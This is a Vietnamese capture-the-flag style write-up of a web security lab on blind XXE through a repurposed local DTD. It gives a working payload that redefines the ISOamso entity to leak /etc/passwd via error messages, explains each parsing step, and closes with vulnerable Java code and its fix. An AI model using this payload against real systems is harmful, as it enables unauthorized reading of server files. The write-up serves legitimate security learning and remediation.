![](../assets/Pasted%20image%2020261118195401.png)

# 1. Mục tiêu
Khai thác chức năng "Check stock" để đọc được nội dung trong /etc/passwd. Khác với bài trước là fetch file .dtd từ attacker server. Bài này đã chặn tính năng kết nối ra bên ngoài nên các kỹ thuật trước đó không sử dụng được. Cần phải sử dụng file local DTD có sẵn trong chính server của lab, sau đó redefine các entity. Đề bài đã cho sẵn đường dẫn tới file local dtd kèm theo là entity có tên ISOamso. Trong thực tế không có sẵn thì phải fuzzing và quan sát response để mò xem file local dtd có tên và được lưu ở đâu, sau đó tìm đúng tên entity tương ứng để redefine.

# 2. Recon
![](../assets/Pasted%20image%2020261118092456.png)Giống LAB01, vẫn là chức năng Check Stock để kiểm tra hàng tồn kho.
Click vào "Check stock", vào HTTP History trên Burp Suite đọc HTTP Request.

```http
POST /product/stock HTTP/2
Host: 0a0c009e0463e57c82d24cb1000f0062.web-security-academy.net
Cookie: session=1FrcFLiuTDSa5Wi2rIiYShoDoS3RZrDG
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0a0c009e0463e57c82d24cb1000f0062.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0c009e0463e57c82d24cb1000f0062.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

# 3. Exploit
```DTD
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```
Logic khai thác cơ bản vẫn giống các lab trước. Ở đây thay vì load file .dtd ở attacker server thì : <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> khai báo file dtd ở local của chính server của lab. Sau đó:
[1] Định nghĩa lại entity %ISOamso
[2] Yêu cầu parse %local_dtd; , khi này các bước xảy ra thực tế như sau:
- Gọi tới yêu cầu load file docbookx.dtd
- Khi này entity %ISOamso đã được định nghĩa lại ở trên, nên khi có câu gọi %ISOamso; ở bên trong docbookx.dtd thì sẽ chạy với định nghĩa đầu tiên được khai báo (chính là phần ở trên đã sửa đổi)
- *&#x25;* được parse thành ký tự *%*,  *&#x26;* được parse thành *&*, *&#x27* được parse thành *'* Khi đó nội dung sau khi parse lần đầu có dạng: 
```DTD
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
- Đến đây gặp %eval; , tiếp tục parse eval thành
```DTD
<!ENTITY % error SYSTEM 'file:///nonexistent/<nội dung thật của /etc/passwd>'>
```
- Sau đó gặp tiếp %error; , parse nốt => thực hiện truy xuất file và báo lỗi đính kèm ở response. Khai thác thành công. Hoàn thành lab.

Ba điểm dễ gây hoang mang khi đọc payload này, tự giải đáp lại cho chắc:

> **Không hề thấy dòng nào gọi `%ISOamso;` — vậy nó bung bằng cách nào?** Payload của mình **không gọi**. Chính **file `docbookx.dtd` tự gọi `%ISOamso;`** bên trong nó. Khi `%local_dtd;` nạp file đó vào, dòng gọi entity **của chính file** sẽ chạy — và vì mình đã khai `%ISOamso` **đè lên trước** nên nó bung ra bản exploit thay vì bản gốc. Đây đúng nghĩa của chữ **"repurpose"**: chiếm dụng một dòng gọi entity vốn có sẵn trong file.

> **Vì sao áp được chuyện "đè"?** Luật XML: entity khai báo nhiều lần thì **lần đầu tiên thắng** (declare-first-wins). Mình khai `%ISOamso` trong internal subset (đứng trước), nên khi file DTD khai lại bản gốc của nó thì bản đó bị bỏ qua. Thêm nữa, vì entity này vốn thuộc **external DTD**, nên luật cấm "parameter-entity-trong-parameter-entity" được nới ra — đúng thứ mình cần để dựng chuỗi error-based.

> **Vì sao thực chiến phải đi tải một bản copy của file DTD rồi soi chọn entity?** Vì muốn đè thì phải biết **tên chính xác** của một entity mà file thực sự dùng tới. Server không cho xem file của nó, nên mình tải bản copy của đúng file DTD đó (DTD mã nguồn mở) về đọc. Entity chọn để đè phải thỏa hai điều: (1) được **khai trong external DTD** (để nới luật PE-trong-PE), và (2) **thực sự được file gọi tới** (để exploit được kích hoạt). Lab này đề cho sẵn `ISOamso` + đường dẫn, còn ngoài đời thì phải fuzzing path của local DTD rồi mò tên entity.

![](../assets/Pasted%20image%2020261118220807.png)
![](../assets/Pasted%20image%2020261118220830.png)

# 4. Mô phỏng backend xử lý

```java
// [LỖI 1] — XXE: bật các tính năng nguy hiểm
dbf.setFeature(".../load-external-dtd", true);
dbf.setFeature(".../external-parameter-entities", true);
...
} catch (Exception e) {
    // [LỖI 2] — phơi nguyên lỗi chi tiết ra client
    return "... " + e.toString() + " ...";
}
```


# 5. Cách vá
```java
// vá [LỖI 1] — tắt DTD, dập tắt XXE tận gốc
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// vá [LỖI 2] — log chi tiết ở server, trả client lỗi chung chung
catch (Exception e) {
    log.error("parse failed", e);           // chi tiet chi vao log noi bo
    return "400 Bad Request\n\"Invalid XML\"";  // client chi thay thong bao mo ho
}
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load dtd nếu ứng dụng không dùng tới chức năng đó. Ngoài ra đáng lẽ chỉ nên ghi lỗi chi tiết ở server, không hiển thị lỗi cho client, chỉ nên trả cho client thông báo chung chung kiểu "Invalid XML".
# 6. Sự khác biệt trong cấu hình ở 3 lab 05 06 07
```
Lab05. Firewall MỞ  + external DTD (http)  → lấy /etc/host qua GET Request tới attacker server
Lab06. Firewall CHẶN + external DTD (http)  → FIREWALL: egress blocked   (không lấy được qua URL) -> phải lấy qua error message ở response
Lab07. Firewall CHẶN kín các kết nối -> tự load local dtd và tái cấu trúc rồi mới lấy được dữ liệu
```
